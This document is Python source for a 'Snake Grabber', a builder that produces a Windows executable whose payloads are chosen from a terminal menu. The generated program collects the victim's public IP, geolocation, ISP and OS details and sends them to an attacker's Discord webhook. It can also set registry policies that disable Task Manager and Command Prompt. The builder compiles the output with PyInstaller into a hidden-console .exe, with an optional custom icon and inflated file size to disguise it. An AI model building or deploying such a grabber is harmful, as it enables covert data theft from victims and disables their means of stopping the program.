# Libaries
import sys
sys.path.insert(0, "../")
import os
import shutil
from time import sleep
from colorama import Fore as Color
import main as home
from modules.helper import banner, change_console_title, cls, validate_name, create_dump, is_float


class script: # Script settings
    debug = False
    class grabbers:
        # Grab IP Address
        grab_ip = False
        # Grab OS Info
        grab_os = False
    class payloads:
        # Disable Task Manager
        disable_taskmgr = False
        # Disable Command Prompt
        disable_cmd = False
        # Show Message Box
        class message_box:
            show = False
            title = "Title"
            description = "Description"
            type = 1
            # 1 = showinfo
            # 2 = showwarning
            # 3 = showerror
            # 4 = askyesno
            # 4 = askokcancel
            # 5 = askquestion
            # 6 = askretrycancel
            # 7 = askyesnocancel
    class properties:
        name = "script"
        webhook_url = "https://discord.com/api/webhooks/"
        convert2exe = True
        icon = ""
        size = 0
        show_console = False
class builder: # Grabber and payload scripts
    class grabber: # Grabber script builder
        # IP Grabber
        ip = """
def ip():
    import socket, requests, json, sys
    from datetime import datetime
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0"}
    hostname = socket.gethostname()
    country = ""
    city = ""
    isp = ""
    zip_code = ""
    x = ""
    y = ""
    try:
        public_ip = requests.get("https://ipapi.co/ip", headers=headers).text
        try:
            ip_request = requests.get(f"http://ip-api.com/json/{public_ip}?fields=1098745")
            if ip_request.status_code == 200:
                ipdata = json.loads(ip_request.text)
                if ipdata["status"] == "success":country = ipdata["country"];city = ipdata["city"];zip_code = ipdata["zip"];x = ipdata["lon"];y = ipdata["lat"];isp = ipdata["isp"]
                elif ipdata["status"] == "fail": pass
            else:
                pass
        except:
            pass
    except requests.ConnectionError:
        return sys.exit()
    embed =  {
        "title": "IP Grabber",
        "description": 
                f"Host name: {hostname}\\n"
                f"IP address: {public_ip}\\n"
                f"Country: {country}\\n"
                f"City: {city}\\n"
                f"Zip: {zip_code}\\n"
                f"ISP: {isp}\\n"
                f"Longitude (X): {x}\\n"
                f"Latitude (Y): {y}\\n",
        "footer": {"text": f"ipaddr@grabber.snake | {datetime.now()}"}
    }
    return embed"""
        # OS Info Grabber
        os = """
def os():
    import platform
    from datetime import datetime
    embed = {
        "title": "OS Grabber",
        "description":
            f"Operating system: {platform.platform()}\\n"
            f"Machine type: {platform.machine()}\\n"
            f"Processor type: {platform.processor()}\\n",
        "footer": {"text": f"os@grabber.snake | {datetime.now()}"}
    }
    return embed"""
        # Minecraft login info grabber

    class payload: # Payload script builder
        # Disable Task Manager (require administrator privilages)
        disable_taskmgr = """\n
def disable_taskmgr():
    import winreg
    if isAdmin():
        winreg.SetValueEx(winreg.OpenKey(winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER), "Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_ALL_ACCESS), "DisableTaskMgr", None, winreg.REG_DWORD, 1)
        tracker.dtmgr_succeed = True
    else:
        tracker.dtmgr_succeed = False
        pass"""
        # Disable Command Prompt (require administrator privilages)
        disable_cmd = """\n
def disable_cmd():
    import winreg
    if isAdmin():
        winreg.SetValueEx(winreg.OpenKey(winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER), "Software\Policies\Microsoft\Windows\System", 0, winreg.KEY_ALL_ACCESS), "DisableCMD", None, winreg.REG_DWORD, 1)
        tracker.dcmd_succeed = True
    else:
        tracker.dcmd_succeed = False
        pass"""
        # Display a message box
        def display_messagebox(notiftype, title, description):
            notiftypeformatted = str(notiftype).replace("1", "showinfo").replace("2", "showwarning").replace("3", "showerror").replace("4", "askyesno").replace("5", "askyesnocancel")
            if title != "__file__":
                title = f"\"{title}\"" 
            elif "__file__" in str(title):
                title = "f\"{__file__}\"" 
            if description != "__file__":
                description = f"\"{description}\""
            elif description == "__file__":
                description = "f\"{__file__}\""
            script = f"""\n
            # Display a desktop notification
            # Display a picture
            # Play a video
            # Change desktop wallpaper
            # Write a note on dekstop/current dir
def messagebox():
    from tkinter import messagebox
    m = messagebox.{notiftypeformatted}({title},{description})
    if m:
        return
    else:
        return"""
            return script
class terminal:
    default_color = Color.RED
    false_color = Color.RED
    true_color = Color.GREEN
    value_color = Color.YELLOW
    debug_color = Color.YELLOW
    error_color = Color.RED

# Helper

class err:
    back = ""
def error(message:str):
    if not callable(err.back): return
    cls()
    print(terminal.error_color + "[!] " + message)
    err.back()

def grabber_opt(): # Grabber selector
    err.back = grabber_opt
    if script.debug:
        change_console_title("Snake Grabber (DEBUG)")
        terminal.default_color = Color.BLUE
        cls()
    else: 
        change_console_title("Snake Grabber")
        terminal.default_color = Color.RED
        cls()
    banner.grabber.grabber()
    print(" " * 15 + terminal.default_color + "[" + terminal.true_color +" Grabber > " + terminal.false_color + "Payload > Properties > Compile " + terminal.default_color +"]\n")
    print(" " * 15 + terminal.default_color +  "-1. Disable all")
    print(" " * 15 + terminal.default_color +  "0. Enable All")
    print(" " * 15 + terminal.default_color +  "1. Grab IP address            : " + str(script.grabbers.grab_ip).replace("True", terminal.true_color + "True" + terminal.default_color).replace("False", terminal.false_color + "False"))
    print(" " * 15 + terminal.default_color +  "2. Grab OS info               : " + str(script.grabbers.grab_os).replace("True", terminal.true_color + "True" + terminal.default_color).replace("False", terminal.false_color + "False"))
    print(" " * 15 + terminal.default_color +  "99. Next")
    print(" " * 15 + terminal.default_color +  "100. Return to main\n")
    option = input(terminal.default_color + "[>] Select option to toggle: ")
    if option == '':
        error("Select an option.")
    elif option == 'debug':
        script.debug = not script.debug
        cls()
        grabber_opt()
    elif not option.isnumeric() and not str(option) == "-1":
        error("Option is not a number.")
    elif int(option) == -1:
        cls()
        script.grabbers.grab_ip = False
        script.grabbers.grab_os = False
        grabber_opt()
    elif int(option) == 0:
        cls()
        script.grabbers.grab_ip = True
        script.grabbers.grab_os = True
        grabber_opt()
    elif int(option) == 1:
        script.grabbers.grab_ip = not script.grabbers.grab_ip
        cls()
        grabber_opt()
    elif int(option) == 2:
        script.grabbers.grab_os = not script.grabbers.grab_os
        cls()
        grabber_opt()
    elif int(option) == 99:
        cls()
        payload_opt()
    elif int(option) == 100:
        cls()
        home.main()
        sys.exit()
    else:
        error("Invalid option.")

def payload_opt(): # Payload selector
    err.back = payload_opt
    banner.grabber.payload()
    print(" " * 15 + terminal.default_color + "[" + terminal.true_color +" Grabber > Payload > " + terminal.false_color + "Properties > Compile " + terminal.default_color + "]\n")
    print(" " * 15 + terminal.default_color + "-1. Disable all")
    print(" " * 15 + terminal.default_color + "0. Enable All")
    print(" " * 15 + terminal.default_color + "1. Disable Task Manager*      : " +  str(script.payloads.disable_taskmgr).replace("True", terminal.true_color + "True" + terminal.default_color).replace("False", terminal.false_color + "False"))
    print(" " * 15 + terminal.default_color + "2. Disable Command Prompt*    : " +  str(script.payloads.disable_cmd).replace("True", terminal.true_color + "True" + terminal.default_color).replace("False", terminal.false_color + "False"))
    if script.payloads.message_box.show:
        print(" " * 15 + terminal.default_color + "3. Show Message Box           : " + terminal.true_color + "True")
        print(" " * 18 + terminal.default_color + "3.1. Title                      : " + terminal.value_color + str(script.payloads.message_box.title))
        print(" " * 18 + terminal.default_color + "3.2. Description                : " + terminal.value_color + str(script.payloads.message_box.description))
        print(" " * 18 + terminal.default_color + "3.3. Type                       : " + terminal.value_color + str(script.payloads.message_box.type)
        .replace("1", "1 (Show Info)")
        .replace("2", "2 (Show Warning)")
        .replace("3", "3 (Show Error)")
        .replace("4", "4 (Ask Yes/No)")
        .replace("5", "5 (Ask Yes/No/Cancel)") + terminal.default_color)
    else:
        print(" " * 15 + terminal.default_color +  "3. Show Message Box           : " + terminal.false_color + "False")
    print(" " * 15 + terminal.default_color +  "99. Next")
    print(" " * 15 + terminal.default_color +  "100. Return to grabber\n")
    print(" " * 15 + terminal.default_color +  "* : Require admin\n")

    option = input(terminal.default_color + "[>] Select option to toggle: ")
    if option == "":
        error("Select an option.")
    # elif not option.isdecimal() and not str(option) == "-1":
    elif not is_float(option):
        error("Option is not a number.")
    elif int(float(option)) == -1:
        cls()
        script.payloads.disable_taskmgr = False
        script.payloads.disable_cmd = False
        script.payloads.message_box.show = False
        payload_opt()
    elif int(float(option)) == 0:
        cls()
        script.payloads.disable_taskmgr = True
        script.payloads.disable_cmd = True
        script.payloads.message_box.show = True
        payload_opt()
    elif int(float(option)) == 1:
        script.payloads.disable_taskmgr = not script.payloads.disable_taskmgr
        cls()
        payload_opt()
    elif int(float(option)) == 2:
        script.payloads.disable_cmd = not script.payloads.disable_cmd
        cls()
        payload_opt()
    elif int(float(option)) == 3:
        if float(option) == 3.1:
            title = input("[>] Title: ")
            script.payloads.message_box.title = str(title)
            cls()
            payload_opt()
        elif float(option) == 3.2:
            description = input("[>] Description: ")
            script.payloads.message_box.description = str(description)
            cls()
            payload_opt()
        elif float(option) == 3.3:
            print("1. Show Info")
            print("2. Show Warning")
            print("3. Show Error")
            print("4. Ask Yes/No")
            print("5. Ask Yes/No/Cancel")
            type = input("[>] Type: ")
            if type == "":
                error("Select an option.")
            elif not type.isnumeric():
                error("Option is not a number.")
            elif 0 > int(type) < 6:
                error("Unknown type.")
            else:
                script.payloads.message_box.type = type
                cls()
                payload_opt()
        elif float(option) > 3.3:# and not float(option) >= 4:
            error("Invalid suboption.")
        else:
            script.payloads.message_box.show = not script.payloads.message_box.show
            cls()
            payload_opt()

        # toggle = input("[>] Toggle (enter/y/n) ")
        # if toggle == "":
        #     script.payloads.message_box.show = not script.payloads.message_box.show
        # elif toggle.lower() == "y":
        #     script.payloads.message_box.show = True
        # elif toggle.lower() == "n":
        #     script.payloads.message_box.show = False
        # else: 
        #     script.payloads.message_box.show = script.payloads.message_box.show
        # if script.payloads.message_box.show ==  False:
        #     cls()
        #     payload_opt()
        # print(terminal.default_color + "\n[i] Type \"__file__\" to set title/description as file name")
        # title = input("[>] Title: ")
        # script.payloads.message_box.title = str(title)
        # description = input("[>] Description: ")
        # script.payloads.message_box.description = str(description)
        # print("1. Show Info")
        # print("2. Show Warning")
        # print("3. Show Error")
        # print("4. Ask Yes/No")
        # print("5. Ask Yes/No/Cancel")
        # type = input("[>] Type: ")
        # if type == "":
        #     cls()
        #     print("[!] Type cannot be empty")
        #     payload_opt()
        # elif not type.isnumeric():
        #     cls()
        #     print("[!] Type is not a number")
        #     payload_opt()
        # elif 0 < int(type) < 6:
        #     script.payloads.message_box.type = type
        #     cls()
        #     payload_opt()
        # else:
        #     cls()
        #     print("[!] Invalid type.")
        #     payload_opt()
        # script.payloads.message_box.type = type
        # script.payloads.message_box.show = not script.payloads.message_box.show
        # cls()
        # payload_opt()
    elif int(float(option)) == 99:
        cls()
        properties_opt()
    elif int(float(option)) == 100:
        cls()
        grabber_opt()
    else:
        error("Invalid option.")

def properties_opt(): # Get app info
    banner.grabber.properties()
    print(" " * 15 + terminal.default_color + "[" + terminal.true_color +" Grabber > Payload > Properties" + terminal.false_color +" > Compile " + terminal.default_color + "]\n")
    print(" " * 15 + terminal.default_color + "1. File name      : " + terminal.value_color + str(script.properties.name) + str(script.properties.convert2exe).replace("True", ".exe").replace("False", ".py"))
    print(" " * 15 + terminal.default_color + "2. Webhook URL    : " + terminal.value_color + str(script.properties.webhook_url))
    print(" " * 15 + terminal.default_color + "3. Convert to exe : " + str(script.properties.convert2exe).replace("True", terminal.value_color + "True"))
    if script.properties.convert2exe:
        if script.properties.icon:
            print(" " * 15 + terminal.default_color + "4. Icon file      : " + terminal.value_color + str(script.properties.icon) + ".ico")
        else:
            print(" " * 15 + terminal.default_color + "4. Icon file      : None (Default Pyinstaller Icon)")
        if int(script.properties.size) > 0:
            print(" " * 15 + terminal.default_color + "5. Add file size  : " + terminal.value_color + str(script.properties.size) + " MB")
        else:
            print(" " * 15 + terminal.default_color + "5. Add file size  : 0 MB (Original size)")
        print(" " * 15 + terminal.default_color + "6. Show console   : " + str(script.properties.show_console).replace("True", terminal.value_color + "True"))
    else:
        print(" " * 15 + terminal.default_color + "4. Icon file      : [ DISABLED ]")
        print(" " * 15 + terminal.default_color + "5. Add file size  : [ DISABLED ]")
        print(" " * 15 + terminal.default_color + "6. Show console   : [ DISABLED ]")
    print(" " * 15 + terminal.default_color + "99. Compile")
    print(" " * 15 + terminal.default_color + "100. Return to payloads\n")
    print(" " * 15 + terminal.default_color + "If add file size is 0, no dump files will be added")
    print(" " * 15 + terminal.default_color + "If Icon file is empty, it will use the default pyinstaller icon\n")
    option = input(terminal.default_color + "[>] Select an option to modify: ")
    if option == "":
        error("Select an option.")
    elif not option.isnumeric():
        error("Option is not a number.")
    elif int(option) > 3 > 99 and not script.properties.convert2exe:
        error("Option is disabled. Enable  \"convert to exe\" to enable this option.")
    elif int(option) == 1:
        name = str(input(terminal.default_color + "[>] File name: "))
        if name == "":
            error("Enter a name.")
        elif validate_name(name):
            script.properties.name = name
            cls()
            properties_opt()
        else: 
            error("Name is invalid.")
    elif int(option) == 2:
        url = input(terminal.default_color + "[>] Webhook URL: ")
        if url == "":
            error("Enter a URL.")
        script.properties.webhook_url = url
        cls()
        properties_opt()
    elif int(option) == 3:
        convert = input(terminal.default_color + "[>] Convert to exe (Y/n) ")
        if convert.lower() == "y" or convert == "":
            script.properties.convert2exe = True
            cls()
            properties_opt()
        else:
            script.properties.convert2exe = False
            cls()
            properties_opt()
    elif int(option) == 4:
        icon = input(terminal.default_color + "[>] Icon file: ")
        script.properties.icon = icon
        cls()
        properties_opt()
    elif int(option) == 5:
        size = input(terminal.default_color + "[>] Add file size: ")
        if size == "":
            error("Size cannot be empty.")
        elif not size.isnumeric():
            error("Size is not a number.")
        else:
            script.properties.size = size
            cls()
            properties_opt()
    elif int(option) == 6:
        show = input(terminal.default_color + "[>] Show console (y/N)")
        if show.lower() == "n" or show == "":
            script.properties.show_console = False
            cls()
            properties_opt()
        else:
            script.properties.show_console = True
            cls()
            properties_opt()
    elif int(option) == 99:
        confirm = input(terminal.default_color + "[>] Are you sure all the informations above are all correct? (Y/n) ")
        if confirm.lower() == "y" or confirm == "":
            cls()
            compile()
        else:
            properties_opt()
    elif int(option) == 100:
        cls()
        payload_opt()
    else:
        error("Invalid option.")

def compile(): # Compile the app
    banner.grabber.compile()
    print(" " * 15 + terminal.default_color + "[" + terminal.true_color +" Grabber > Payload > Properties > Compile " + terminal.default_color +"]\n")
    print("\n\n")
    ### Write script ###
    print("[i] Writing script...")
    s = open(script.properties.name + '.py', 'w')
    s.write("")
    s.close()
    with open(script.properties.name + '.py', 'a') as w:
        w.write("class tracker:\n")
        w.write("    isAdmin = False\n")
        if script.payloads.disable_taskmgr:
            w.write("    dtmgr_succeed = False\n")
        if script.payloads.disable_cmd:
            w.write("    dcmd_succeed = False\n\n")
        w.write("def main():\n")
        w.write("    from datetime import datetime\n")
        w.write("    embeds = [\n") # [ Call Grabber
        if script.grabbers.grab_ip:
            w.write("        ip(),\n") # Call IP Grabber
        if script.grabbers.grab_os:
            w.write("        os(),\n") # Call OS Grabber
        w.write("    ]\n") # Call Grabber ]
        w.write("    tracker.isAdmin = isAdmin()\n")
        if script.payloads.disable_taskmgr:
            w.write("    disable_taskmgr()\n") # Call Disable Taskmgr Payload
        if script.payloads.disable_cmd:
            w.write("    disable_cmd()\n") # Call Disable Taskmgr Payload
        if script.payloads.message_box.show:
            w.write("    messagebox()\n")
        w.write("    embeds.append({\n")
        w.write("        \"title\": \"Payloads\",\n")
        w.write("        \"description\": \n")
        description = "            f\"Is admin: {tracker.isAdmin}\\n"
        end = "\",\n"
        if script.payloads.disable_taskmgr:
            description += "Disabled task manager: {tracker.dtmgr_succeed}\\n"
        if script.payloads.disable_cmd:
            description += "Disabled command prompt: {tracker.dcmd_succeed}"
        description += end
        w.write(description)
        w.write("        \"footer\": {\"text\": f\"payloads@payload.snake | {datetime.now()}\"}\n")
        w.write("    })\n")
        w.write("    send_webhook(embeds)\n") # Call webhook
        if script.grabbers.grab_ip: # IP Grabber
            w.write(builder.grabber.ip)
        if script.grabbers.grab_os: # OS Grabber
            w.write(builder.grabber.os)
        if script.payloads.disable_taskmgr: # "Disable Taskmgr" Payload
            w.write(builder.payload.disable_taskmgr)
        if script.payloads.disable_cmd:
            w.write(builder.payload.disable_cmd) # "Disable CMD" Payload
        if script.payloads.message_box.show:
            w.write(builder.payload.display_messagebox(script.payloads.message_box.type, script.payloads.message_box.title, script.payloads.message_box.description))
        w.write("\ndef send_webhook(embeds):\n")
        w.write("    import requests\n")
        w.write("    data = {\"username\": \"s.py\", \"embeds\": embeds}\n")
        w.write(f"    requests.post(url=\"{script.properties.webhook_url}\", json=data)\n")
        w.write("\ndef isAdmin():\n")
        w.write("    import os, ctypes\n")
        w.write("    try:\n")
        w.write("        is_admin = (os.getuid() == 0)\n")
        w.write("    except AttributeError:\n")
        w.write("        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0\n")
        w.write("    return is_admin\n")
        w.write("if __name__ == '__main__': main()")
    ### Write script ###

    if script.properties.convert2exe:
        print("[i] Generating conversion command...")
        command = "pyinstaller --onefile "  
        if script.debug: print(terminal.debug_color + "[DEBUG] "  + command + terminal.default_color)
        if int(script.properties.size) > 0:
            print("[i] Writing dump file...")
            create_dump(str(script.properties.name), int(script.properties.size))
            command += f"--add-data \"{str(script.properties.name)};.\" "
        if script.debug: print(terminal.debug_color + "[DEBUG] "  + command + terminal.default_color)
        if not script.properties.show_console:
            command += "-w "
        if script.debug: print(terminal.debug_color + "[DEBUG] "  + command + terminal.default_color)
        if script.properties.icon:
            command += f"-i " + str(script.properties.icon) + ".ico "
        if script.debug: print(terminal.debug_color + "[DEBUG] "  + command + terminal.default_color)
        command += str(script.properties.name) + ".py"
        if script.debug: print(terminal.debug_color + "[DEBUG] " + command + terminal.default_color)

        print("[i] Compiling script to executable...\n")
        sleep(5)
        os.system(command)
        input("[>] Press ENTER to delete files and folder created by pyinstaller")
        try:
            print("[i] Moving executable to current directory...")
            os.rename(os.getcwd() + f"\\dist\\{script.properties.name}.exe", os.getcwd() + f"\\{script.properties.name}.exe") # Move exe to current dir
            if int(script.properties.size) > 0:
                print("[i] Deleting dump file...")
                os.remove(f".\\{script.properties.name}") # Delete dump file
            print("[i] Deleting script file...")
            os.remove(f".\\{script.properties.name}.py") # Delete script file
            print("[i] Deleting spec file...")
            os.remove(f".\\{script.properties.name}.spec") # Delte whatever this is file
            print("[i] Deleting build directory")
            shutil.rmtree(".\\build") # Delete "build" dir
            print("[i] Deleting dist directory")
            shutil.rmtree(".\\dist") # Delete "dist" dir
        except shutil.Error as err:
            if script.debug:
                print(err)
                input(terminal.debug_color +  "[DEBUG][SHUTIL] Enter: ")
                cls()
                grabber_opt()
            else:
                pass
        except os.error as err:
            if script.debug:
                print(err)
                input(terminal.debug_color + "[DEBUG][OS] Enter: ")
                cls()
                grabber_opt()
            else:
                pass
        print(terminal.default_color + f"[i] Script saved as {script.properties.name}.exe")
        input(terminal.default_color + "[>] Press ENTER to return...")
        cls()
        grabber_opt()
    else:
        print(terminal.default_color + f"[i] Script saved as {script.properties.name}.py")
        input(terminal.default_color + "[>] Press ENTER to return...")
        cls()
        grabber_opt()

if __name__ == "__main__":
    grabber_opt()